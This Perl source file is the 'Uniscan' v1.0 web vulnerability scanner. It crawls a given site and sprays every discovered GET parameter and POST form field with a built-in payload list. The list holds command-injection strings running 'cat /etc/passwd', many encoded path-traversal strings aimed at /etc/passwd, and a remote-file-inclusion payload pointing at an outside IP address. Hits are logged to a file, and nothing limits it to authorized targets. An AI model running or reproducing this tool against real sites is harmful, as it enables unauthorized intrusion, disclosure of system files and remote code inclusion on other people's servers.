#!/usr/bin/perl

#################################################
# Uniscan project				#
# author: Douglas Poerschke Rocha		#
# visit: http://sourceforge.net/p/uniscan/	#
#################################################
use strict;
use HTTP::Request;
use HTTP::Headers;
use LWP::UserAgent;
use threads;
use threads::shared;
use Thread::Queue;
use URI;

our $version;
our $timeout 	: shared;	# timeout 	=> time(in seconds)
our $variation 	: shared;	# variation 	=> maximum number of variations
our $max_size 	: shared;	# max_size 	=> maximum size in bytes of http request default: 1MB
our $max_threads: shared;	# max_threads 	=> maximum number of simultaneously active threads
our $max_reqs	: shared;	# max_reqs 	=> crawler maximum number of requests
our $try 	: shared;
our $cont 	: shared;
our $q 		: shared;
our $rfi_return	: shared;	# rfi_return => return of the base64 string of the hosted file for inclusion 
our $url 	: shared;
our $c		: shared;
our $extensions : shared;	# extensions => contains all the extensions that the scanner will ignore
our %files	: shared;	# hash with the found files
our %forms 	: shared;	# hash with the found forms
our @list 	: shared;	# arrray with the list of urls to exploit
our %urls 	: shared;	# hash to check if a url has already been found (to avoid repetition)
our $host 	: shared;
our $u 		: shared;
our $p 		: shared;
our @strings 	: shared;
our @threads;

#############################
#  CONFIGURATION
#############################

$version	= 1.0;
$variation	= 2;
$timeout	= 10;
$c		= 0;
$rfi_return 	= "unipampascanunipampa"; 
$url  		= $ARGV[0];
$extensions 	= ".exe.pdf.xls.csv.mdb.rpm.deb.doc.jpg.jpeg.png.gif.bmp.tgz.gz.bz2.zip.rar.tar.asf.avi.bin.dll.fla.mp3.mpg.mov.ogg.ppt.rtf.scr.wav";
$max_threads 	= 15;
$max_reqs	= 15000;
$max_size 	= 1048576;

@strings = (
			'|cat%20/etc/passwd',
			'|cat%20/etc/passwd|',
			'|cat%20/etc/passwd%00|',
			'|cat%20/etc/passwd%00.html|',
			'|cat%20/etc/passwd%00.htm|',
			'|cat%20/etc/passwd%00.dat|',
			'system("cat%20/etc/passwd");',
			'.system("cat%20/etc/passwd").',
			':system("cat%20/etc/passwd");',
			';system("cat%20/etc/passwd").',
			';system("cat%20/etc/passwd")',
			';system("cat%20/etc/passwd");',
			':system("cat%20/etc/passwd").',
			'`cat%20/etc/passwd`',			
			'../../../../../../../../../../etc/passwd%00',
			'../../../../../../../../../../etc/passwd%00.jpg',
			'../../../../../../../../../../etc/passwd%00.html',
			'../../../../../../../../../../etc/passwd%00.css',
			'../../../../../../../../../../etc/passwd%00.php',
			'../../../../../../../../../../etc/passwd%00.txt',
			'../../../../../../../../../../etc/passwd%00.inc',
			'../../../../../../../../../../etc/passwd%00.png',
			'../../../../../../../../../../etc/passwd',
			'//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd',
			'//../../../../../../../../etc/passwd',
			'//../../../../../../../../etc/passwd%00',
			'//../../../../../../../../etc/passwd%00en',
			'//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
			'//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
			'//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
			'//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd',
			'//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
			'//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd',
			'//....................etc/passwd',
			'//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255..%255..%255cetc/passwd',
			'//%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd',
			'//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd',
			'//%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252eetc/passwd',
			'../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
			'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.',
			'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
			'/\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../etc/passwd',
			'/../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd%00',
			'.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd',
			'../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
			'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
			'..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
			'http://200.132.146.43/c.txt?'
			);
$| = 1;

&banner();
&main();





################################
# 	SCANNER FUNCTIONS
################################




sub main(){

if(!$url || $url !~ /https?:\/\/.+\//){
	print "Use: perl $0 http://www.example.com/\n\n";
	exit;
}

$host = &host($url);

# crawler start
$q = new Thread::Queue;
$q->enqueue($url);

threads->new(\&crawling, $q->dequeue);
@threads = threads->list;
$u++;
while($q->pending() || scalar(@threads) ){

                @threads = threads->list;
                if ($q->pending > 0) {
                        if  ($#threads < $max_threads) {
				if($p <= $max_reqs){
					print("\rCrawling: ". int(($p/$u)*100) ."% Urls: [$p - $u] \r");
					threads->new(\&crawling, $q->dequeue);
				}
				else{
					while($q->pending()){
						$q->dequeue;
					}
				}
                       } else {
                                foreach my $running (@threads) {
                                        print("\rCrawling: ". int(($p/$u)*100) ."% Urls: [$p - $u] \r");
					$running->join();
                                }
                        }
                } else {
                        if ($#threads > 0) {
                                foreach my $running (@threads) {
					print("\rCrawling: ". int(($p/$u)*100) ."% Urls: [$p - $u] \r");
                                        $running->join();
                                }
                        } 
                }

}

foreach my $running (@threads) {
           $running->join();
}

# crawler end

print "\nCrawling finished, " . scalar(@list) ." urls found\n";

@list = &mix(@list); 		# include the strings to try explore possible vulnerability
@list = &remove(@list); 	# remove duplicate tests

print "Tests by GET method: " . scalar(@list) . "\n";
print "Starting tests by GET method.\n";

$p =0;
$u = $#list;

$q = new Thread::Queue;

#test each element of url list
foreach my $teste (@list){
	$q->enqueue($teste); 
	$try++;
}

while ($q->pending() || scalar(@threads)) {
                @threads = threads->list;
                if ($q->pending > 0) {
                        if  ($#threads < $max_threads) {
				print "\rThreads: ". $#threads . " [$cont - $try] \r";
                                threads->new(\&check_vul_get, $q->dequeue);
                                $cont++;
                        } else {
                                foreach my $running (@threads) {
					print "\rThreads: ". $#threads . " [$cont - $try] \r";
                                        $running->join();
                                }
                        }
                } else {
                        if ($#threads > 0) {
                                foreach my $running (@threads) {
					print "\rThreads: ". $#threads . " [$cont - $try] \r";
                                        $running->join();
                                }
                        } 
                }
        }


print "Tests by GET method finished\n";
print "starting tests by POST method\n";

$q = new Thread::Queue;
$try = 0;
$cont = 0;

#test each found forms
foreach my $action (%forms)
{
	my $data = $forms{$action};
	foreach my $teste (@strings){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 
}

while ($q->pending() || scalar(@threads)) {
                @threads = threads->list;
                if ($q->pending > 0) {
                        if  ($#threads < $max_threads) {
				print "\rThreads: ". $#threads . " [$cont - $try] \r";
                                threads->new(\&check_vul_post, $q->dequeue);
                                $cont++;
                        } else {
                                foreach my $running (@threads) {
					print "\rThreads: ". $#threads . " [$cont - $try] \r";
                                        $running->join();
                                }
                        }
                } else {
                        if ($#threads > 0) {
                                foreach my $running (@threads) {
					print "\rThreads: ". $#threads . " [$cont - $try] \r";
                                        $running->join();
                                }
                        } 
                }
        }


print "Tests by POST method finished\n";
print "\nScanning finished\n";
}

sub crawling(){
	my $l = shift;
	my @tmp = &get_urls($l);
	$p++;
	foreach my $t (@tmp){
		if((!$urls{$t}) && $t =~/^https?:\/\/[a-z\.\d]*$host\//){
			push(@list, $t);
			$q->enqueue($t);
			$u++;
			$urls{$t} = 1;
		}
	}
	print("\rCrawling: ". int(($p/$u)*100) ."% Urls: [$p - $u] \r");

}


sub check_vul_get(){
	my $url1 = shift;
	my $res = &get_http($url1);
	if(($res =~/root:x:0:0:root/) || ($res =~/$rfi_return/)){
		print "Vul: $url1\n";
		&grava("Vuls.txt", $url1);
	}
}


sub check_vul_post(){
	my ($action, $data)  = split('#', shift);
	my $res	   = &post_http($action, $data);
	if(($res =~/root:x:0:0:root/) || ($res =~/$rfi_return/)){
		print "Vul: $action\n$data\n";
		&grava("Vuls.txt", ($action, $data));
	}
}


sub mix(){
	my @list = @_;
	my @list2 = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				foreach my $str (@strings){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}
			}
		}
	}
	@list = ();
	return(@list2);
}


sub add_form(){
	my $site = $_[0];
	my $content = $_[1];
	my @form = ();
	my $url2;
	my $host = &host($site);
	my @inputs = &get_input($content);
	$content =~/<form.*action=\"(.*?)\".*>/i;
	$form[0] = $1;
	if(length($form[0]) <1){
		$form[0] = &get_file($site);
	}
	$content =~/<form.*method=\"(.*?)\".*>/i;
	$form[1] = $1;	
	if($form[1] =~/get/i){
		if($form[0] !~ /^https?:\/\//){
			
			if($form[0] =~/^\//){
			substr($form[0], 0, 1) = "";
			}
			$url2 = $url.$form[0].'?';
		}
		else{
			$url2 = $form[0] . '?';
		}
		foreach my $var (@inputs){
			$url2 .= '&'.$var .'=123';
		}
		
		my $fil = &get_file($url2);
		my $ext = &get_extension($fil);
		if($extensions !~/$ext/){
			$files{$fil}++;
			if($files{$fil} <= $variation){
				if($url2 =~/^https?:\/\/[a-z\.\d]*$host\//){
					push(@list, $url2);
				}
			}
		}
	}
	else{
		if($form[0] !~ /https?:\/\//){
			$form[0] = $url.$form[0];
		}
		my $data;
		foreach my $var (@inputs){
			$data .='&'.$var.'=123';
		}
		if(!$forms{$form[0]}){
			$forms{$form[0]} = $data;
		}
	}
}


sub get_input(){
	my $content = shift;
	my @input = ();
	while ($content =~  m/<input.*name=\"(.+?)\".*>/gi){
		push(@input, $1);
	}
	while ($content =~  m/<input.*name=\'(.+?)\'.*>/gi){
		push(@input, $1);
	}
	return @input;
}


sub get_http(){
    	my $url1 = shift;
    	my $req=HTTP::Request->new(GET=>$url1);
    	my $ua=LWP::UserAgent->new(agent => "Uniscan/". $version . " http://sourceforge.net/p/uniscan/");
    	$ua->timeout($timeout);
	$ua->max_size($max_size);
    	my $response=$ua->request($req);
    	return $response->content;
}


sub post_http(){
	my $url1 = $_[0];
	my $data = $_[1];
	$data =~ s/\r//g;
    	my $headers = HTTP::Headers->new();
    	my $request= HTTP::Request->new("POST", $url1, $headers);
    	$request->content($data);
    	$request->content_type('application/x-www-form-urlencoded');
    	my $ua=LWP::UserAgent->new(agent => "Uniscan/". $version . " http://sourceforge.net/p/uniscan/");
    	$ua->timeout($timeout);
	$ua->max_size($max_size);
	my $response=$ua->request($request);
	return $response->content;
}


sub get_urls()
{
    	my $base = shift;
    	my @lst = ();
	my @ERs = (	"<a.*href=\"(.+)\".*>", 
			"<a.*href='(.+)'.*>", 
			"location.href='(.+)'", 
			"location.href=\"(.+)\"", 
			"<meta.*content=\"?.*;URL=(.+)\"?.*?>"
		);
				
    	my $result = &get_http($base);
	my $host = &host($base);
	if($result =~ /<form/i){
		&add_form($base, $result);
	}
    	if($result){
		chomp($result);
		foreach my $er (@ERs){
			while ($result =~  m/$er/gi)
			{
				my $link = $1;
				if ($link =~/"/){
					$link = substr($link,0,index($link, '"'));
				}
				if ($link =~/'/){
					$link = substr($link,0,index($link, "'"));
				}
				
				if($link !~/^https?:\/\// && $link !~/https?:\/\// && $link !~/:/){
					if($link =~/^\//){
						substr($link,0,1) = "";
					}
					$link = $url . $link;
				}
				chomp $link;
				$link =~s/&amp;/&/g;
		 
				if($link =~/^https?:\/\// && $link =~/^https?:\/\/[a-z\.\d]*$host\// && $link !~/#|javascript:|mailto:/){
					my $fil = &get_file($link);
					my $ext = &get_extension($fil);
					if($extensions !~/$ext/){
						$files{$fil}++;
						if($files{$fil} <= $variation){
							push (@lst,$link);
						}
					}
				}
			}
		}
	}
    	return @lst;
}



sub banner(){
	printf("###############################\n# Uniscan by poerschke        #\n###############################\nV. %.2f\n\n", $version);
}

sub host(){
  	my $h = shift;
  	my $url1 = URI->new( $h || return -1 );
  	return $url1->host();
}


sub get_file(){
	my $url1 = shift;
	substr($url1,0,7) = "" if($url1 =~/http:\/\//);
	substr($url1,0,8) = "" if($url1 =~/https:\/\//);
	$url1 = substr($url1, index($url1, '/'), length($url1));
	if($url1 =~/\?/){
		$url1 = substr($url1, 0, index($url1, '?'));
	}
	return $url1;
}


sub grava(){
	my ($filtxt, @content) = @_;
	open(my $a, ">>$filtxt");
	foreach(@content){
		print $a "$_\n";
	}
	close($a);
}

sub get_extension(){
	my $file = shift;
	if($file =~/\./){
		my $ext = substr($file, rindex($file, '.'), length($file));
		$ext =~ s/ //g;
		if($ext !~/\(|\)|\-|\//){
			return $ext;
		}
		else {
			return 0;
		}
	}
	else{
		return 0;
	}
}

sub remove{
   	my @si = @_;
   	my @novo = ();
   	my %ss;
   	foreach my $s (@si)
   	{
        	if (!$ss{$s})
        	{
            		push(@novo, $s);
            		$ss {$s} = 1;
        	}
    	}
    	return (@novo);
}

